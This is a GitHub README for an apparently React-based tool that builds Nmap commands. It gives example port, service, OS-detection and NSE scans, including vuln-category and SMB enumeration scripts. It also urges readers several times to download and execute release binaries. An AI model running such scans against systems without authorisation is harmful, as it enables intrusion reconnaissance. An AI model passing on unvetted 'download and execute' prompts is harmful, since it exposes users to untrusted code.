https://github.com/sathya992001/NMAP-COMMAND-GENERATOR/releases

# NMAP Command Generator — React Tool for Nmap Commands Online 🚀

[![Releases](https://img.shields.io/github/v/release/sathya992001/NMAP-COMMAND-GENERATOR?label=Releases&color=2b7bb9&logo=github)](https://github.com/sathya992001/NMAP-COMMAND-GENERATOR/releases) [![Built with React](https://img.shields.io/badge/React-17.0.2-61DAFB?logo=react&logoColor=white)](https://reactjs.org) ![Nmap](https://upload.wikimedia.org/wikipedia/commons/5/5f/NmapLogo.png)

A web tool that builds Nmap commands from UI choices. It supports Basic, Advanced, and NSE modes. The app runs in a browser and outputs ready-to-run Nmap commands. Use the tool to compose scans for discovery, port audits, service detection, and script-based checks.

- Topics: free-nmap-command-generator, free-nmap-scan, generate-nmap-command, network-scanner, network-scanning, network-scanning-and-enumeration, nmap, nmap-command-generator, nmap-commands, nmap-online-tool, nmap-scan, nmap-scan-script, nmap-scanning, nmap-scripts, react

---

![Screenshot](https://cdn.pixabay.com/photo/2016/11/29/03/53/terminal-1869236_1280.jpg)

Table of contents
- Features
- Modes
- How it works
- Quick start (Releases)
- Run locally (dev)
- Generator UI walkthrough
- Examples and command patterns
- NSE scripts and templates
- Tips for common scans
- Contribute
- License & contact

Features
- Build Nmap commands with a visual UI.
- Basic mode for hostname and port range input.
- Advanced mode for flags, timing, and output options.
- NSE mode for selecting and configuring scripts.
- Copy-to-clipboard for generated commands.
- Export commands as shell-ready text.
- Lightweight React front end. No server required to generate commands.

Modes

Basic
- Target entry: single IP, CIDR, or hostname.
- Port options: top ports, specific ports, port ranges.
- Common switches: -sS, -sT, -Pn toggle.
- Output: plain Nmap command string.

Advanced
- Timing templates: -T0 .. -T5 selection.
- Scan types: -sS, -sT, -sU, -sA, -sV, -sC etc.
- Service detection and OS detection flags: -sV, -O.
- Output formats: -oN, -oX, -oG, -oA.
- Custom arguments input field for direct flag entry.

NSE (Nmap Scripting Engine)
- Script categories: default, discovery, vuln, auth, broadcast.
- Script arguments: set script variables and values.
- Prebuilt templates for common checks (vuln scan, smb enum, http probes).
- Combine multiple scripts and pass --script-args.

How it works
- UI maps fields and toggles to Nmap flags.
- The app composes a sanitized command string.
- UI shows the full command in a single editable line.
- Copy or export the line and run on your host with Nmap installed.

Quick start (Releases)
Visit the Releases page to get packaged builds and assets. Download the release file and execute it on a host that can run web builds or binaries. For this repo, go to:
https://github.com/sathya992001/NMAP-COMMAND-GENERATOR/releases

If the release contains a web build (zip or tarball), extract and run the included start script or serve the build folder with any static server. If the release contains a desktop binary, download and run the executable that matches your OS. The release assets need to be downloaded and executed to run the packaged app.

Run locally (development)
1. Clone the repo
2. Install dependencies
3. Start the dev server

Example commands
```bash
git clone https://github.com/sathya992001/NMAP-COMMAND-GENERATOR.git
cd NMAP-COMMAND-GENERATOR
npm install
npm start
# open http://localhost:3000 in your browser
```

Generator UI walkthrough

Main panel
- Target input: add one or several targets. Use commas or spaces.
- Port selector: choose top ports, common range, or custom list.
- Profile selector: Basic / Advanced / NSE.

Right panel
- Generated command field that updates on every change.
- Copy button to copy the exact command.
- Save button to export as .sh or .txt.

Advanced controls
- Timing slider sets -T0..-T5.
- Verbose toggle -v or -vv.
- Output format selector adds -oN, -oX, -oG, -oA as needed.
- Proxy support field for wrapping the scan via proxychains or socat.

NSE script editor
- Select scripts by name or category.
- Add --script-args key=value pairs.
- Combine --script and --script-args into single command.

Examples and command patterns

Discovery scan (common)
```bash
nmap -sS -Pn -p 1-1024 -T4 example.com
```

Service and OS detection
```bash
nmap -sS -sV -O -p 22,80,443 -T4 target.example
```

UDP scan (slow)
```bash
nmap -sU -p 53,67,123 -T3 target.net
```

Quick top ports scan
```bash
nmap --top-ports 100 -sS -T4 --open target.local
```

Output to files
```bash
nmap -sS -p 1-65535 -oA scans/target-scan -T4 target.ip
```

NSE scripts and templates

Common NSE invocation
- Single script:
```bash
nmap --script http-title -p 80 example.com
```
- Multiple scripts by category
```bash
nmap --script "default,safe" -p 80,443 target.host
```
- Script with args
```bash
nmap --script smb-enum-shares --script-args smbuser=user,smbpass=pass -p 445 target.ip
```

Prebuilt templates in the UI
- HTTP audit: uses http-enum, http-slowloris-check, http-title.
- SMB enum: uses smb-enum-shares, smb-os-discovery.
- Vuln quick: uses vuln category scripts for high-risk checks.

Tips for common scans
- Use -Pn for hosts that block ICMP.
- Use -T4 for LAN; use -T3 or lower on remote or rate-limited networks.
- Use --open to show only open ports.
- When running heavy scans, route output to files with -oA for full records.
- Combine -sV with --version-all for deeper service checks but expect longer run times.

Security and etiquette
- Run scans against systems you own or have permission to test.
- Limit scan scope when you test in shared environments.
- Use timing and throttle controls to reduce load on targets and networks.

Contribute
- Open issues for bugs or feature requests.
- Fork the repo, make changes, and submit a pull request.
- Include small, focused commits and a clear PR description.

Developer notes
- The UI maps inputs to a safe command string. The app does not run Nmap on the server.
- The project uses React for the UI and standard npm scripts for dev and build.

Badges and social
- Use the Releases badge above to jump to packaged builds.
- You can link the demo or the deployed app if a release contains an index.html build.

Issues & feedback
- Use GitHub Issues for bug reports and feature requests.
- Suggest new NSE templates via PR or issue.

License
- Check the LICENSE file in the repository for license terms.

Contact
- Create an issue or open a PR to start a conversation.

Releases and downloads
Click the Releases badge at the top or visit:
https://github.com/sathya992001/NMAP-COMMAND-GENERATOR/releases
Download the release asset for your platform or the web build and execute the included file or script to run the packaged app.